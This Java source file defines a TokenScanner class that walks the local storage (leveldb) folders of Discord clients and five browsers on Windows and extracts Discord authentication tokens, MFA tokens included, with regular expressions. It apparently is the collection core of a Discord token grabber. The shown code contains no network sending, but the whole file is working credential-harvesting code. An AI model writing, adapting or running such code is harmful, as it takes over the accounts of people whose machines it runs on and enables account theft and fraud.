import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TokenScanner {

    private static final Pattern[] TOKEN_PATTERNS = {

        Pattern.compile("[A-Za-z0-9]{24}\\.[A-Za-z0-9]{6}\\.[A-Za-z0-9_\\-]{27}"),

        Pattern.compile("mfa\\.[A-Za-z0-9_\\-]{84}"),

        Pattern.compile("[A-Za-z0-9_\\-]{24}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{38}")
    };

    private static final String[] LEVELDB_EXTENSIONS = { ".ldb", ".log" };

    public static List<String> scanAllLocations() {
        List<String> tokens = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");

        String[] discordApps = { "discord", "discordcanary", "discordptb", "discorddev" };
        for (String app : discordApps) {
            File leveldbDir = new File(appData, app + "\\Local Storage\\leveldb");
            if (leveldbDir.exists()) {
                tokens.addAll(scanDirectory(leveldbDir));
            }
        }

        String[] browserPaths = {
            localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
        };
        for (String path : browserPaths) {
            File dir = new File(path);
            if (dir.exists()) {
                tokens.addAll(scanDirectory(dir));
            }
        }

        return new ArrayList<>(new java.util.LinkedHashSet<>(tokens));
    }

    public static List<String> scanDirectory(File leveldbDir) {
        List<String> tokens = new ArrayList<>();
        File[] files = leveldbDir.listFiles();
        if (files == null) return tokens;

        for (File file : files) {
            String name = file.getName().toLowerCase();
            boolean isLevelDbFile = false;
            for (String ext : LEVELDB_EXTENSIONS) {
                if (name.endsWith(ext)) { isLevelDbFile = true; break; }
            }
            if (!isLevelDbFile) continue;

            try {

                String content = new String(Files.readAllBytes(file.toPath()));
                tokens.addAll(extractTokens(content));
            } catch (Exception ignored) {}
        }
        return tokens;
    }

    public static List<String> extractTokens(String content) {
        List<String> tokens = new ArrayList<>();
        for (Pattern pattern : TOKEN_PATTERNS) {
            Matcher matcher = pattern.matcher(content);
            while (matcher.find()) {
                String token = matcher.group();
                if (!tokens.contains(token)) {
                    tokens.add(token);
                }
            }
        }
        return tokens;
    }
}